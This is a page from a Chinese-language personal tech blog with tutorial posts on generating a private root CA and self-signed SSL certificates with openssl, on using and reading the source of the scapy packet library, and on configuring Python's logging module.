<!DOCTYPE html>
<html lang="en">
<head>
  <!-- <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'> -->
   <link href='//fonts.proxy.ustclug.org/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
  <link rel="stylesheet" type="text/css" href="http://littlezz.github.io/theme/css/style.min.css">
  <link rel="stylesheet" type="text/css" href="http://littlezz.github.io/theme/css/pygments.min.css">
  <link rel="stylesheet" type="text/css" href="http://littlezz.github.io/theme/css/font-awesome.min.css">
  <link href="http://littlezz.github.io/static/custom.css" rel="stylesheet">
  <link href="http://littlezz.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="littlezz's Blog Atom">

  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="" />
  <meta name="author" content="littlezz" />
  <meta name="description" content="littlezz's Thoughts and Writings About Python And Machine Learning and diary" />
<meta property="og:site_name" content="littlezz's Blog"/>
<meta property="og:type" content="blog"/>
<meta property="og:title" content="littlezz's Blog"/>
<meta property="og:description" content="littlezz's Thoughts and Writings About Python And Machine Learning and diary"/>
<meta property="og:locale" content="en_US"/>
<meta property="og:url" content="http://littlezz.github.io"/>
<meta property="og:image" content="/images/logo.jpg">
  <title>littlezz's Blog</title>
</head>
<body>
  <aside>
    <div>
      <a href="http://littlezz.github.io">
        <img src="/images/logo.jpg" alt="littlezz" title="littlezz">
      </a>
      <h1><a href="http://littlezz.github.io">littlezz</a></h1>
      <p>Everything that has a beginning has an end.</p>
      <nav>
        <ul class="list">
        </ul>
      </nav>
      <ul class="social">
        <li><a class="sc-github" href="https://github.com/littlezz/" target="_blank"><i class="fa fa-github"></i></a></li>
      </ul>
    </div>
  </aside>
  <main>
    <nav>
      <a href="http://littlezz.github.io">Home</a>
      <a href="/categories">Category</a>
      <a href="/tags">Tags</a>
      <a href="http://littlezz.github.io/feeds/all.atom.xml">Atom</a>
    </nav>

<article>
  <header>
    <h2><a href="http://littlezz.github.io/ru-he-sheng-cheng-zi-yong-de-ssl-ren-zheng-zheng-shu.html#ru-he-sheng-cheng-zi-yong-de-ssl-ren-zheng-zheng-shu">如何生成自用的 SSL 认证证书</a></h2>
    <p>
      Posted on Mon 11 September 2017 in <a href="http://littlezz.github.io/category/code.html">Code</a>
      &#8226; Tagged with
      <a href="http://littlezz.github.io/tag/xiao-jie.html">小结</a>,      <a href="http://littlezz.github.io/tag/ji-suan-ji-wang-luo.html">计算机网络</a>      &#8226; <a href="http://littlezz.github.io/ru-he-sheng-cheng-zi-yong-de-ssl-ren-zheng-zheng-shu.html#disqus_thread">Leave a comment</a>
    </p>
  </header>
  <div>
      <p>本文结合 <a href="https://datacenteroverlords.com/2012/03/01/creating-your-own-ssl-certificate-authority/">creating-your-own-ssl-certificate-authority</a> 这篇文章，描述如何生成一个4096位的私有证书， 同时解决 Chrome 浏览器不识别的问题。 </p>
<p>Let's encrypt 只能对域名签发证书， 如果希望在内网中使用， 或者是对 IP 使用， 需要自己签发证书。  </p>
<h2>总览</h2>
<p>证书是为了在使用 HTTPS 中对对方进行认证， 确认目标。所以证书都是对域名或者 ip 签发的。<br>
对于自用证书，一般有两种方式，一种是生成一对证书，然后服务器和客户端分别装上。<br>
另一种方法是生成一个『根认证证书』，再由这个根认证配合秘钥向服务器签发证书，服务器安装根认证，之后可以识别所有这个根认证签发的服务器的证书。  </p>
<p>我们首先将生成证书认证（CA）， 之后用 CA 对服务器签发证书（cert）</p>
<p>生成 CA 的步骤：  </p>
<ol>
<li>生成秘钥</li>
<li>自签名</li>
<li>在客户端上安装 CA</li>
</ol>
<p>之后用 CA 对服务器签发证书:</p>
<ol>
<li>生成CSR</li>
<li>利用 CA 和秘钥对CSR 签名</li>
</ol>
<h2>生成根证书</h2>
<p>根证书只用生成一次</p>
<h3>生成秘钥</h3>
<p>秘钥需要被<strong>严格保密</strong>。</p>
<div class="highlight"><pre><span></span>openssl genrsa -out rootCA.key 4096
</pre></div>

<p>这里生成了4096位的秘钥</p>
<h3>自签名</h3>
<p>自签名后生成的 pem 文件用于在客户端上面安装。  </p>
<div class="highlight"><pre><span></span>openssl req -x509 -new -nodes -key rootCA.key -sha384 -days 8192 -out rootCA.pem
</pre></div>

<p>这里采用了 sha384，以及有效期设置为了8192天  </p>
<p>之后会进入一个交互页面， 按需要填写对应的信息。  </p>
<h3>在客户端上面安装根认证</h3>
<p>Chrome 和 Safari 和 IE 都使用系统的证书管理， 把.pem文件安装， 然后设置为任何时间都信任。<br>
firefox 有自己的证书系统， 需要特别的在浏览器内安装</p>
<h2>对服务器签发证书</h2>
<p>每个服务器都单独的签发。</p>
<h3>生成 CSR</h3>
<ol>
<li>
<p>先生成一个新的私钥</p>
<div class="highlight"><pre><span></span>openssl genrsa -out test_server.key 2048
</pre></div>

</li>
<li>
<p>生成 certificate signing request.</p>
<div class="highlight"><pre><span></span>openssl req -new -key test_server.key -out test_server.csr
</pre></div>

<p>和之前一样， 会进入一个交互式的设置， 其中， 需要正确设置<code>common-name</code>  </p>
<div class="highlight"><pre><span></span>Common Name (eg, YOUR name) []: 192.168.1.112
</pre></div>

</li>
</ol>
<h3>签发证书</h3>
<h4>v3.ext</h4>
<p>为了解决 google 不识别 subjectaltname 从而不识别证书的问题， 需要新建一个 <code>v3.ext</code>，写入下面内容</p>
<p><div class="highlight"><pre><span></span>authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = IP:192.168.1.112
</pre></div>
ip可以替换为自己要签发的 ip</p>
<h4>签发证书</h4>
<div class="highlight"><pre><span></span>openssl x509 -req -in test_server.csr -CA rootCA.pem -CAkey rootCA.key -CAcreateserial -out test_server.crt -days 7500 -sha384 -extfile ./v3.ext
</pre></div>

<h2>总结</h2>
<p>到此，我们有了</p>
<div class="highlight"><pre><span></span>rootCA.key      rootCA.srl      test_server.csr
rootCA.pem      test_server.crt test_server.key
</pre></div>

<p>这些文件， 其中<code>rootCA.key</code>需要被妥善保管， 任何拥有<code>rootCA.key</code>都可以伪造签发证书。  </p>
<p><code>rootCA.pem</code>公开， 用于客户端安装  </p>
<p><code>test_server.key</code>以及<code>test_server.crt</code>保密， 用于在服务器运行时提供给服务器。  </p>
<p>2017年09月11日17:52:15</p>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="http://littlezz.github.io/scapy-zong-jie-er.html#scapy-zong-jie-er">scapy 总结（二）</a></h2>
    <p>
      Posted on Thu 03 August 2017 in <a href="http://littlezz.github.io/category/python.html">Python</a>
      &#8226; Tagged with
      <a href="http://littlezz.github.io/tag/python.html">python</a>,      <a href="http://littlezz.github.io/tag/xiao-jie.html">小结</a>      &#8226; <a href="http://littlezz.github.io/scapy-zong-jie-er.html#disqus_thread">Leave a comment</a>
    </p>
  </header>
  <div>
      <p>关于字节流中恢复包， 定义新的协议以及sniff 源码分析</p>
<h2>从字节流中恢复包</h2>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="n">Ether</span>
<span class="n">b</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</pre></div>

<h2><code>Packet</code> 类和其子类</h2>
<p>在 scapy 中， 定义了一些类， 用于处理不同层中的数据， 层和层之间存在上下关系。 每一层只解析对应的数据， 其余的被当成 <code>payload</code> 存放。比如<code>Ether</code>只解析 mac 地址， 之后 IP 层的数据都存在 payload 中。</p>
<p>在当前层解析完成之后， 余下的 payload会调用<code>guess_payload_class</code>来猜测下一层需要使用的类， 之后交由下一层来解析剩下的 payload。</p>
<p><code>Ether</code> <code>IP</code> <code>UDP</code> <code>TCP</code>等都是<code>Packet</code>的子类，每一层都定义了 field， 存放于<code>field_desc</code>中， field 为 descriotor， 用于处理数据类型， 类似于 django model 中的<code>Field</code>。</p>
<p>比如定义一个新的 layer</p>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Disney</span><span class="p">(</span><span class="n">Packet</span><span class="p">):</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;DisneyPacket &quot;</span>
    <span class="n">fields_desc</span><span class="o">=</span><span class="p">[</span> <span class="n">ShortField</span><span class="p">(</span><span class="s2">&quot;mickey&quot;</span><span class="p">,</span><span class="mi">5</span><span class="p">),</span>
                 <span class="n">XByteField</span><span class="p">(</span><span class="s2">&quot;minnie&quot;</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span> <span class="p">,</span>
                 <span class="n">IntEnumField</span><span class="p">(</span><span class="s2">&quot;donald&quot;</span> <span class="p">,</span> <span class="mi">1</span> <span class="p">,</span>
                      <span class="p">{</span> <span class="mi">1</span><span class="p">:</span> <span class="s2">&quot;happy&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">:</span> <span class="s2">&quot;cool&quot;</span> <span class="p">,</span> <span class="mi">3</span><span class="p">:</span> <span class="s2">&quot;angry&quot;</span> <span class="p">}</span> <span class="p">)</span> <span class="p">]</span>
</pre></div>

<p>具体可以参考 <a href="http://scapy.readthedocs.io/en/latest/build_dissect.html">http://scapy.readthedocs.io/en/latest/build_dissect.html</a>  </p>
<h3>自带的包序列化</h3>
<p>文档里面没有提及， 我翻源码的时候看到有<code>import_object</code> 和<code>export_object</code>函数， 用于把包序列化。  代码位于 <code>utils.py</code> 中</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">export_object</span><span class="p">(</span><span class="n">obj</span><span class="p">):</span>
    <span class="kn">import</span> <span class="nn">dill</span> <span class="kn">as</span> <span class="nn">pickle</span>
    <span class="kn">import</span> <span class="nn">base64</span>
    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">gzip</span><span class="o">.</span><span class="n">zlib</span><span class="o">.</span><span class="n">compress</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="mi">4</span><span class="p">),</span><span class="mi">9</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</pre></div>

<p>返回 pickle 序列化后压缩然后 b64编码的值。  </p>
<h3>sniff 函数源码分析</h3>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">sniff</span><span class="p">(</span><span class="n">count</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">offline</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">prn</span> <span class="o">=</span> <span class="bp">None</span><span class="p">,</span> <span class="n">lfilter</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">L2socket</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span>
          <span class="n">opened_socket</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">stop_filter</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">exceptions</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="o">*</span><span class="n">arg</span><span class="p">,</span> <span class="o">**</span><span class="n">karg</span><span class="p">):</span>
    <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">if</span> <span class="n">opened_socket</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">opened_socket</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">offline</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">L2socket</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
                <span class="n">L2socket</span> <span class="o">=</span> <span class="n">conf</span><span class="o">.</span><span class="n">L2listen</span>
            <span class="n">s</span> <span class="o">=</span> <span class="n">L2socket</span><span class="p">(</span><span class="nb">type</span><span class="o">=</span><span class="n">ETH_P_ALL</span><span class="p">,</span> <span class="o">*</span><span class="n">arg</span><span class="p">,</span> <span class="o">**</span><span class="n">karg</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">s</span> <span class="o">=</span> <span class="n">PcapReader</span><span class="p">(</span><span class="n">offline</span><span class="p">)</span>

    <span class="n">lst</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">if</span> <span class="n">timeout</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">stoptime</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span><span class="o">+</span><span class="n">timeout</span>
    <span class="n">remain</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">timeout</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
                <span class="n">remain</span> <span class="o">=</span> <span class="n">stoptime</span><span class="o">-</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
                <span class="k">if</span> <span class="n">remain</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
                    <span class="k">break</span>
            <span class="n">sel</span> <span class="o">=</span> <span class="n">select</span><span class="p">([</span><span class="n">s</span><span class="p">],[],[],</span><span class="n">remain</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">sel</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
                <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">MTU</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">p</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
                    <span class="k">break</span>
                <span class="k">if</span> <span class="n">lfilter</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">lfilter</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
                    <span class="k">continue</span>
                <span class="k">if</span> <span class="n">store</span><span class="p">:</span>
                    <span class="n">lst</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
                <span class="n">c</span> <span class="o">+=</span> <span class="mi">1</span>
                <span class="k">if</span> <span class="n">prn</span><span class="p">:</span>
                    <span class="n">r</span> <span class="o">=</span> <span class="n">prn</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
                    <span class="k">if</span> <span class="n">r</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
                        <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">stop_filter</span> <span class="ow">and</span> <span class="n">stop_filter</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
                    <span class="k">break</span>
                <span class="k">if</span> <span class="n">count</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">c</span> <span class="o">&gt;=</span> <span class="n">count</span><span class="p">:</span>
                    <span class="k">break</span>
    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">exceptions</span><span class="p">:</span>
            <span class="k">raise</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">pass</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">opened_socket</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
            <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">plist</span><span class="o">.</span><span class="n">PacketList</span><span class="p">(</span><span class="n">lst</span><span class="p">,</span><span class="s2">&quot;Sniffed&quot;</span><span class="p">)</span>
</pre></div>

<p>首先初始化<code>c</code>，用于无条件统计包的个数， 初始化<code>s</code>， 该对象的来源有三种途径， 从<code>opened_socket</code>参数设置一个给定的打开的 socket 对象， 或者是在 <code>offline</code>设定了文件路径的时候使用<code>PcapReader</code>, 最后使用默认的<code>L2listen</code>.<br>
之后进入循环， 使用<code>select</code>监听s 的可读事件， 每次读入之后对包做处理， 先用<code>lfilter</code>, 然后判断<code>store</code>为真将包存入列表中， 使用<code>prn</code>设置的函数,使用<code>stop_filter</code>设置的函数， 判断 c 和 count 的大小， 是否退出循环。  </p>
<p>函数捕获 <code>KeyboardInterrupt</code>异常， 循环结束后返回存储的列表。  </p>
<p>有几个不是很好的地方， 一个是 变量c默认不断的累加包数量， 另一个是 select 的超时参数被用于设置 sniff 的监听时间了，  在设置为无限运行时， sniff会在没有包到来的时候永久阻塞， 由于判断退出的回调函数是在处理每个包时调用的， 所以无法正常的退出。</p>
<p>如果你希望 sniff 函数作为线程长期运行，但是又希望能在没有包到来的情况下按时的退出， 一种是发送一自定义的包， 触发 stop_filter函数， 另一种是修改 sniff 源码，select 的 timeout 参数设置为一个 sweep timeout， 用于定时的结束 select 的 block， 然后检查循环是否需要退出。</p>
<p>2017年08月03日17:23:46</p>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="http://littlezz.github.io/logging-shi-yong-zong-jie.html#logging-shi-yong-zong-jie">Logging 使用总结</a></h2>
    <p>
      Posted on Wed 02 August 2017 in <a href="http://littlezz.github.io/category/python.html">Python</a>
      &#8226; Tagged with
      <a href="http://littlezz.github.io/tag/python.html">python</a>,      <a href="http://littlezz.github.io/tag/xiao-jie.html">小结</a>      &#8226; <a href="http://littlezz.github.io/logging-shi-yong-zong-jie.html#disqus_thread">Leave a comment</a>
    </p>
  </header>
  <div>
      <h3>总览</h3>
<p>logging 分为3大模块，<code>Logger</code>, <code>Handler</code>, 同时还有<code>Format</code>来控制输出的格式。  </p>
<p>logger 用于在应用中产生 log 信息实例， 这个信息之后会被 handler 处理， 用于分配 log 信息记录的位置， 比如是打印到屏幕上还是存放到文件中，一个log 信息可以被多个 handler 处理， 即， 一个 logger 可以有零个多个 handler。<br>
logger 和 handler 都有独立的记录等级， 只有在这个等级之上的信息才回被记录。 记录等级包括：</p>
<div class="highlight"><pre><span></span>DEBUG
INFO
WARNING
ERROR
CRITICAL
</pre></div>

<p>默认等级是 <code>WARNING</code>。  </p>
<p>对于 format 用于处理记录信息的格式， 比如<code>%(message)s %(asctime)s</code>. 利用老旧的<code>%s</code>的原因是为了兼容之前的版本， 可以在之后的设置中使用新的<code>{</code>风格。  </p>
<p>logger 存在高低层关系， 底层的 logger 产生的信息会上传到父层中。</p>
<p>对于 logger， 有多种配置方式， 主要由两种， 基于 conf 的， 和使用代码的， 这里只总结了使用代码的。  </p>
<h3>logger</h3>
<p>logger 通过 getLogger 函数得到， 可以在不同的模块中使用不同的 logger</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">logging</span>
<span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">&#39;some infomation&#39;</span><span class="p">)</span>
</pre></div>

<h3>Handler</h3>
<p>handler 有多种， 可以记录到 console， 或者到文件， 文件也可以自动 rotate， 常用的几个 handler</p>
<ul>
<li>StreamHandler。 打印到终端</li>
<li>FileHandler  保存到文件</li>
<li>RotatingFileHandler 保存到文件， 达到一定大小之后备份文件。</li>
<li>TimedRotatingFileHandler 定时备份</li>
</ul>
<p>其余参考 <a href="https://docs.python.org/3/howto/logging.html#useful-handlers">useful-handlers</a>  </p>
<h3>formatter</h3>
<table>
<thead>
<tr>
<th>Attribute name</th>
<th>Format</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>args</td>
<td>You shouldn’t need to format this yourself.</td>
<td align="left">The tuple of arguments merged into msg to produce message, or a dict whose values are used for the merge (when there is only one argument, and it is a dictionary).</td>
</tr>
<tr>
<td>asctime</td>
<td>%(asctime)s</td>
<td align="left">Human-readable time when the LogRecord was created. By default this is of the form ‘2003-07-08 16:49:45,896’ (the numbers after the comma are millisecond portion of the time).</td>
</tr>
<tr>
<td>created</td>
<td>%(created)f</td>
<td align="left">Time when the LogRecord was created (as returned by time.time()).</td>
</tr>
<tr>
<td>exc_info</td>
<td>You shouldn’t need to format this yourself.</td>
<td align="left">Exception tuple (à la sys.exc_info) or, if no exception has occurred, None.</td>
</tr>
<tr>
<td>filename</td>
<td>%(filename)s</td>
<td align="left">Filename portion of pathname.</td>
</tr>
<tr>
<td>funcName</td>
<td>%(funcName)s</td>
<td align="left">Name of function containing the logging call.</td>
</tr>
<tr>
<td>levelname</td>
<td>%(levelname)s</td>
<td align="left">Text logging level for the message ('DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL').</td>
</tr>
<tr>
<td>levelno</td>
<td>%(levelno)s</td>
<td align="left">Numeric logging level for the message (DEBUG, INFO, WARNING, ERROR, CRITICAL).</td>
</tr>
<tr>
<td>lineno</td>
<td>%(lineno)d</td>
<td align="left">Source line number where the logging call was issued (if available).</td>
</tr>
<tr>
<td>module</td>
<td>%(module)s</td>
<td align="left">Module (name portion of filename).</td>
</tr>
<tr>
<td>msecs</td>
<td>%(msecs)d</td>
<td align="left">Millisecond portion of the time when the LogRecord was created.</td>
</tr>
<tr>
<td>message</td>
<td>%(message)s</td>
<td align="left">The logged message, computed as msg % args. This is set when Formatter.format() is invoked.</td>
</tr>
<tr>
<td>msg</td>
<td>You shouldn’t need to format this yourself.</td>
<td align="left">The format string passed in the original logging call. Merged with args to produce message, or an arbitrary object (see Using arbitrary objects as messages).</td>
</tr>
<tr>
<td>name</td>
<td>%(name)s</td>
<td align="left">Name of the logger used to log the call.</td>
</tr>
<tr>
<td>pathname</td>
<td>%(pathname)s</td>
<td align="left">Full pathname of the source file where the logging call was issued (if available).</td>
</tr>
<tr>
<td>process</td>
<td>%(process)d</td>
<td align="left">Process ID (if available).</td>
</tr>
<tr>
<td>processName</td>
<td>%(processName)s</td>
<td align="left">Process name (if available).</td>
</tr>
<tr>
<td>relativeCreated</td>
<td>%(relativeCreated)d</td>
<td align="left">Time in milliseconds when the LogRecord was created, relative to the time the logging module was loaded.</td>
</tr>
<tr>
<td>stack_info</td>
<td>You shouldn’t need to format this yourself.</td>
<td align="left">Stack frame information (where available) from the bottom of the stack in the current thread, up to and including the stack frame of the logging call which resulted in the creation of this record.</td>
</tr>
<tr>
<td>thread</td>
<td>%(thread)d</td>
<td align="left">Thread ID (if available).</td>
</tr>
<tr>
<td>threadName</td>
<td>%(threadName)s</td>
<td align="left">Thread name (if available).</td>
</tr>
</tbody>
</table>
<h3>example</h3>
<div class="highlight"><pre><span></span><span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">formatter</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">Formatter</span><span class="p">(</span><span class="s2">&quot;[</span><span class="si">%(asctime)s</span><span class="s2">][</span><span class="si">%(levelname)s</span><span class="s2">][</span><span class="si">%(threadName)s</span><span class="s2">][</span><span class="si">%(funcName)s</span><span class="s2">] </span><span class="si">%(message)s</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">file_handle</span> <span class="o">=</span> <span class="n">handlers</span><span class="o">.</span><span class="n">RotatingFileHandler</span><span class="p">(</span><span class="s1">&#39;example.log&#39;</span><span class="p">,</span> <span class="n">maxBytes</span><span class="o">=</span><span class="mi">1024</span><span class="p">,</span>
                                           <span class="n">backupCount</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>

<span class="n">err_handle</span> <span class="o">=</span> <span class="n">handlers</span><span class="o">.</span><span class="n">RotatingFileHandler</span><span class="p">(</span><span class="s1">&#39;err.log&#39;</span><span class="p">,</span> <span class="n">maxBytes</span><span class="o">=</span><span class="mi">1024</span><span class="p">,</span>
                                          <span class="n">backupCount</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>

<span class="n">file_handle</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">)</span>
<span class="n">file_handle</span><span class="o">.</span><span class="n">setFormatter</span><span class="p">(</span><span class="n">formatter</span><span class="p">)</span>

<span class="n">err_handle</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span><span class="p">)</span>
<span class="n">err_handle</span><span class="o">.</span><span class="n">setFormatter</span><span class="p">(</span><span class="n">formatter</span><span class="p">)</span>

<span class="n">console_handle</span>  <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">StreamHandler</span><span class="p">()</span>
<span class="n">console_handle</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">)</span>
<span class="n">console_handle</span><span class="o">.</span><span class="n">setFormatter</span><span class="p">(</span><span class="n">formatter</span><span class="p">)</span>


<span class="n">logger</span><span class="o">.</span><span class="n">addHandler</span><span class="p">(</span><span class="n">file_handle</span><span class="p">)</span>
<span class="n">logger</span><span class="o">.</span><span class="n">addHandler</span><span class="p">(</span><span class="n">console_handle</span><span class="p">)</span>
<span class="n">logger</span><span class="o">.</span><span class="n">addHandler</span><span class="p">(</span><span class="n">err_handle</span><span class="p">)</span>
</pre></div>

<h4>reference</h4>
<p><a href="https://docs.python.org/3/library/logging.html">https://docs.python.org/3/library/logging.html</a> 
<a href="https://docs.python.org/3/howto/logging.html">https://docs.python.org/3/howto/logging.html</a></p>
<p>2017年08月02日17:20:48</p>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="http://littlezz.github.io/scapy-shi-yong-zong-jie.html#scapy-shi-yong-zong-jie">Scapy 使用总结</a></h2>
    <p>
      Posted on Fri 30 June 2017 in <a href="http://littlezz.github.io/category/python.html">Python</a>
      &#8226; Tagged with
      <a href="http://littlezz.github.io/tag/python.html">python</a>,      <a href="http://littlezz.github.io/tag/xiao-jie.html">小结</a>      &#8226; <a href="http://littlezz.github.io/scapy-shi-yong-zong-jie.html#disqus_thread">Leave a comment</a>
    </p>
  </header>
  <div>
      <h3>构造包以及一些网络基础知识</h3>
<p>载入所有函数  </p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
</pre></div>

<p>或者从命令行输入<code>sudo scapy</code></p>
<p>scapy 可以控制各个层的数据， 使用<code>/</code>符号拼合各个层构造出一个包</p>
<div class="highlight"><pre><span></span><span class="n">packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s1">&#39;192.168.1.1&#39;</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="s1">&#39;192.168.1.2&#39;</span><span class="p">)</span><span class="o">/</span> <span class="n">UDP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="mi">5555</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="mi">4444</span><span class="p">)</span><span class="o">/</span> <span class="sa">b</span><span class="s1">&#39;udp data&#39;</span>

<span class="n">packet</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>

<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">packet</span><span class="p">))</span>
</pre></div>

<p>IP层控制 ip 地址， 对于 udp 包来说不需要握手可以伪造源地址。UDP 是和 TCP 平行的一层， 控制发包的源端口和目标端口。<br>
再后面一层是要发送的数据。  </p>
<p><code>packet.show()</code> 工整的打印包数据</p>
<h3>发送包</h3>
<p>scapy 有几种发包的方式。<br>
<code>send</code>用于发送 layer3 层的包， 也就是程序自动处理链路层上面的 mac 地址， 如果想要自定义 mac 地址， 需要使用 sendp， 这是在 layer2 层发包， 这个时候可以自定义 mac 地址。</p>
<div class="highlight"><pre><span></span>send(packet)
sendp(p, iface=&#39;en0&#39;)
packet = Ether(src=RandMAC())/IP(dst=&#39;192.168.31.1&#39;)/UDP(dport=33331)/b&#39;message&#39;
sendp(packet)
</pre></div>

<p><code>sendp</code>可以指定发送的 iface。同时可以构造包的时候加入构造<code>Ether()</code></p>
<h3>UDP广播</h3>
<p>子网内的机器在接受数据时是这样一个流程。<br>
当数据包从网卡流过的时候， 网卡检查数据包的目标 mac 地址是否包含于自己等待的地址中（既网卡可以监听多个 mac 地址）， 符合就吧数据包拷贝一份向上层传输， 之后检查目标 IP 是否和自己监听的 ip 地址之一符合， 如果符合再交由上层处理， 如果不符合， 则看自己是否配置了路由功能， 然后根据路由表选择出口， 如果没有就从默认路由出去。  </p>
<p>之所以有 ip 和 mac 之分， 是因为 mac 地址的表示是48位的， 而网络协议的 ip 是32位的。  </p>
<p>所以在进行广播的时候， 把目标 mac 地址设置为<code>ff:ff:ff:ff:ff:ff</code>, 对于绝大部分机器网卡都会接受这个地址。</p>
<p>一种是受限广播， 目标 ip 设置为<code>255.255.255.255</code>， mac 地址设置为<code>ff:ff:ff:ff:ff:ff</code>， 这种方式路由器不对目的 ip 为<code>255.255.255.255</code> 进行转发，改数据报只在该子网中出现。  </p>
<p>另一种是指向子网的广播， <code>xxx.xxx.xxx.255</code>， 数据包会被转发到该子网内广播。  </p>
